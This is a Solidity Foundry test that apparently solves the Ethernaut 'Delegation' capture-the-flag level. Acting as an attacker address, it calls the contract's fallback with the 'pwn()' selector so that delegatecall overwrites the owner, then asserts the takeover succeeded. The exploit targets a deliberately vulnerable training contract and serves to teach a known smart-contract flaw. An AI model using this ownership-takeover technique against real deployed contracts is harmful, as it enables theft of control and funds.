// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Delegation/Level.sol";
import "forge-std/console.sol";

interface IDelegation {
    function owner() external returns(address);
}

contract FallbackTest is Test {
    IDelegation delegation;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        console.log(deployer, attacker);
        vm.prank(deployer); // deploy the contract as deployer
        Delegate delegate = new Delegate(deployer);
        delegation = IDelegation(address(new Delegation(address(delegate))));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        console.log(delegation.owner());
        (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        assert(worked);
        console.log(delegation.owner());
        /* Write your code here */ 

        /* Validating the test */
        assertEq(delegation.owner(), attacker);
    }

}

